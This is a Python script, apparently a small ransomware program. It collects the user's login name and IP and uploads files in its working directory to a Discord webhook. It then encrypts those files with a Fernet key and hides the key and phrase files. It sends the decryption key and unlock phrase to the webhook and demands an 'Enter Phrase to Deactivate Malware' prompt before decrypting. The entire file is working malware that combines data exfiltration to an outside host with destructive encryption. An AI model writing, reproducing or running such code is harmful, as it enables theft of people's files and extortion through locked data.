import os
from dotenv import load_dotenv
from cryptography.fernet import Fernet
from urllib.request import urlopen
import random
import time
import subprocess
import socket
from discord_webhook import DiscordWebhook, DiscordEmbed

load_dotenv()

site = os.getenv("site")
response = urlopen(site)
txt = response.read()
possiblePhrases = txt.splitlines()

webhook = DiscordWebhook(url=os.getenv("webhook"), rate_limit_retry=True)

userIP = socket.gethostbyname(socket.gethostname())
user = os.getlogin()

#print(str(userIP))
#print(user)

colors = [0xFFE4E1, 0x00FF7F, 0xD8BFD8, 0xDC143C, 0xFF4500, 0xDEB887, 0xADFF2F, 0x800000, 0x4682B4, 0x006400, 0x808080, 0xA0522D, 0xF08080, 0xC71585, 0xFFB6C1, 0x00CED1]
embed = DiscordEmbed(title=f'NAME: {user}', description=f'IP: {userIP}', color=random.choice(colors))

files = []

for file in os.listdir():
    if file.endswith(".py") or file.endswith(".key") or file.endswith(".md") or file.endswith(".env") or file.endswith(".gitignore"):
        continue
    if os.path.isfile(file):
        files.append(file)

for file in files:
    with open(file, "r") as f:
        webhook.add_file(file=f.read(), filename=file)

#print(files)

if os.path.isfile("key.key"):
    pass
else:
    key = Fernet.generate_key()
    with open("key.key", "wb") as theKey:
        #print(theKey)
        theKey.write(key)
        theKeyFile = theKey.name
        subprocess.check_call(["attrib","+H",theKeyFile])
    for file in files:
        with open(file, "rb") as theFile:
            contents = theFile.read()
        contents_enc = Fernet(key).encrypt(contents)
        with open(file, "wb") as theFile:
            theFile.write(contents_enc)

if os.path.isfile("phrase.key"):
    pass
else:
    phrase = random.choice(possiblePhrases)
    with open("phrase.key", "wb") as thePhrase:
        thePhrase.write(phrase)
        thePhraseFile = thePhrase.name
        subprocess.check_call(["attrib","+H",thePhraseFile])

with open("phrase.key", "r") as thePhrase:
    phrase = thePhrase.read()
with open("key.key", "r") as theKey:
    key = theKey.read()

embed.add_embed_field(name=f"Phrase: {phrase}", value=f"Key: {key}", inline=False)
embed.set_timestamp()

webhook.add_embed(embed)

sent_webhook = webhook.execute()

while 1 == 1:
    userPhrase = input("Enter Phrase to Deactivate Malware: ")
    with open("phrase.key", "r") as thePhrase:
        phrase = thePhrase.read()
    #print(userPhrase)
    #print(phrase)
    if userPhrase == phrase:
        print("Correct Phrase, now decrypting files.")
        #os.system('python GoldDecrypt.py')
        with open("key.key", "rb") as thekey:
            key = thekey.read()
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            #print(key)
            #print(contents)
            #missing_padding = 4 - len(key) % 4
            #if missing_padding:
            #    key += b'=' * missing_padding
            contents_dec = Fernet(key).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_dec)
        time.sleep(1)
        os.remove("phrase.key")
        os.remove("key.key")
        print("Files are now decrypted.")
        webhook.delete()
        break
    else:
        print("Incorrect Phrase. Please try again.")